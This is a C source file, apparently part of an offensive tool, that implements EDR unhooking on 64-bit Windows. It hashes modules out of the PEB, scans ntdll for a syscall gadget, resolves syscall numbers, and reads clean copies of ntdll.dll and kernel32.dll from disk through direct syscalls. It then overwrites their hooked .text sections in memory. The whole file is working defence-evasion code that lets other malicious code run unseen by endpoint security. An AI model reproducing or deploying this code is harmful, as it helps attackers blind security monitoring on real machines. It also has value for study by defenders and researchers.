#include "Unhook.h"
#include "Syscalls.h"
#include "ntdll.h"
#include "peb.h"
#include <Shlwapi.h>

// For now, unhooking works on 64-bit Windows only.
// We will not go down the WoW64 rabbit hole, because 32-bit Windows is a minority.

VOID Unhook()
{
	if (IsAtLeastWindows10()) // Windows 7 is currently not supported.
	{
		if (InitializeSyscalls()) // Retrieve gadgets and syscall numbers.
		{
			if (UnhookDll(L"ntdll.dll", 0x3cfa685d))
			{
				UnhookDll(L"kernel32.dll", 0x6a4abc5b);
			}
		}
	}
}

static BOOL InitializeSyscalls()
{
#ifdef _WIN64
	SyscallGadget = GetSyscallGadget();
	if (!SyscallGadget) return FALSE;

	NtCreateFileSyscallNumber = GetSyscallNumber("NtCreateFile");
	if (NtCreateFileSyscallNumber == -1) return FALSE;

	NtQueryInformationFileSyscallNumber = GetSyscallNumber("NtQueryInformationFile");
	if (NtQueryInformationFileSyscallNumber == -1) return FALSE;

	NtReadFileSyscallNumber = GetSyscallNumber("NtReadFile");
	if (NtReadFileSyscallNumber == -1) return FALSE;

	NtProtectVirtualMemorySyscallNumber = GetSyscallNumber("NtProtectVirtualMemory");
	if (NtProtectVirtualMemorySyscallNumber == -1) return FALSE;

	return TRUE;
#else
	return FALSE;
#endif
}
static BOOL UnhookDll(LPCWSTR moduleName, DWORD moduleHash)
{
	BOOL result = FALSE;

#ifdef _WIN64
	WCHAR path[MAX_PATH + 1];
	StrCpyW(path, L"C:\\Windows\\System32\\");
	StrCatW(path, moduleName);

	// Get currently loaded DLL, which is hooked by EDR.
	LPVOID dll = PebGetModuleHandle(moduleHash);
	if (dll)
	{
		// Get original DLL file from disk and read file using syscalls.
		LPBYTE originalDll;
		if (SyscallReadFileContent(path, &originalDll, NULL) && ((PIMAGE_DOS_HEADER)originalDll)->e_magic == IMAGE_DOS_SIGNATURE)
		{
			PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)originalDll + ((PIMAGE_DOS_HEADER)originalDll)->e_lfanew);

			for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
			{
				PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + i * IMAGE_SIZEOF_SECTION_HEADER);

				// Find the .text section of the hooked DLL and overwrite it with the original DLL section
				if (!StrCmpIA((LPCSTR)sectionHeader->Name, ".text"))
				{
					LPVOID virtualAddress = (LPVOID)((ULONG_PTR)dll + (ULONG_PTR)sectionHeader->VirtualAddress);
					SIZE_T virtualSize = sectionHeader->SizeOfRawData;

					ULONGLONG oldProtect;
					if (NT_SUCCESS(SyscallNtProtectVirtualMemory((HANDLE)-1, &virtualAddress, &virtualSize, PAGE_EXECUTE_READWRITE, &oldProtect)))
					{
						i_memcpy(virtualAddress, (LPVOID)((ULONG_PTR)originalDll + (ULONG_PTR)sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData);
						SyscallNtProtectVirtualMemory((HANDLE)-1, &virtualAddress, &virtualSize, oldProtect, &oldProtect);

						result = TRUE;
					}

					break;
				}
			}

			FREE(originalDll);
		}
	}
#endif

	return result;
}

static LPVOID GetSyscallGadget()
{
#ifdef _WIN64
	LPVOID dllBase = PebGetModuleHandle(0x3cfa685d);
	if (dllBase)
	{
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)dllBase + ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew);

		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
		{
			PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER));

			if (!StrCmpIA((LPCSTR)sectionHeader->Name, ".text"))
			{
				LPBYTE virtualAddress = (LPBYTE)((ULONG_PTR)dllBase + (ULONG_PTR)sectionHeader->VirtualAddress);
				DWORD virtualSize = sectionHeader->Misc.VirtualSize;

				for (LPBYTE ptr = virtualAddress; ptr < virtualAddress + virtualSize - 4; ptr++)
				{
					if ((*(LPDWORD)ptr & 0xffffff) == 0xc3050f) // syscall ret
					{
						return ptr;
					}
				}
			}
		}
	}
#endif

	return NULL;
}
static DWORD GetSyscallNumber(PCHAR functionName)
{
#ifdef _WIN64
	LPBYTE dllBase = (LPBYTE)PebGetModuleHandle(0x3cfa685d);
	if (dllBase)
	{
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBase + ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew);
		PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		PNT_IMAGE_RUNTIME_FUNCTION_ENTRY exceptionDirectory = (PNT_IMAGE_RUNTIME_FUNCTION_ENTRY)(dllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);

		PDWORD addressTable = (PDWORD)(dllBase + exportDirectory->AddressOfFunctions);
		PDWORD nameTable = (PDWORD)(dllBase + exportDirectory->AddressOfNames);
		PWORD ordinalTable = (PWORD)(dllBase + exportDirectory->AddressOfNameOrdinals);

		DWORD syscallNumber = 0;

		for (DWORD i = 0; exceptionDirectory[i].BeginAddress; i++)
		{
			for (DWORD j = 0; j < exportDirectory->NumberOfFunctions; j++)
			{
				if (addressTable[ordinalTable[j]] == exceptionDirectory[i].BeginAddress)
				{
					if (!StrCmpA((PCHAR)(dllBase + nameTable[j]), functionName))
					{
						return syscallNumber;
					}
					else if (*(USHORT*)(dllBase + nameTable[j]) == 'wZ')
					{
						syscallNumber++;
					}
				}
			}
		}
	}
#endif

	return -1;
}
static BOOL SyscallReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size)
{
	BOOL result = FALSE;

	WCHAR fullPath[MAX_PATH + 1];
	StrCpyW(fullPath, L"\\??\\");
	StrCatW(fullPath, path);

	UNICODE_STRING fullPathString;
	RtlInitUnicodeString(&fullPathString, fullPath);

	OBJECT_ATTRIBUTES objAttribs;
	i_memset(&objAttribs, 0, sizeof(OBJECT_ATTRIBUTES));
	InitializeObjectAttributes(&objAttribs, &fullPathString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	IO_STATUS_BLOCK ioStatusBlock;
	i_memset(&ioStatusBlock, 0, sizeof(IO_STATUS_BLOCK));

	HANDLE file;
	if (NT_SUCCESS(SyscallNtCreateFile(&file, GENERIC_READ | SYNCHRONIZE, &objAttribs, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)))
	{
		NT_FILE_STANDARD_INFORMATION fileInfo;
		i_memset(&fileInfo, 0, sizeof(NT_FILE_STANDARD_INFORMATION));

		i_memset(&ioStatusBlock, 0, sizeof(IO_STATUS_BLOCK));
		if (NT_SUCCESS(SyscallNtQueryInformationFile(file, &ioStatusBlock, &fileInfo, sizeof(fileInfo), FileStandardInformation)))
		{
			LPBYTE fileData = NEW_ARRAY(BYTE, fileInfo.EndOfFile.QuadPart);

			LARGE_INTEGER byteOffset;
			byteOffset.QuadPart = 0;

			i_memset(&ioStatusBlock, 0, sizeof(IO_STATUS_BLOCK));
			if (SyscallNtReadFile(file, NULL, NULL, NULL, &ioStatusBlock, fileData, fileInfo.EndOfFile.QuadPart, &byteOffset, NULL) == ERROR_SUCCESS)
			{
				*data = fileData;
				if (size) *size = fileInfo.EndOfFile.QuadPart;
				result = TRUE;
			}
			else
			{
				FREE(fileData);
			}
		}
	}

	return result;
}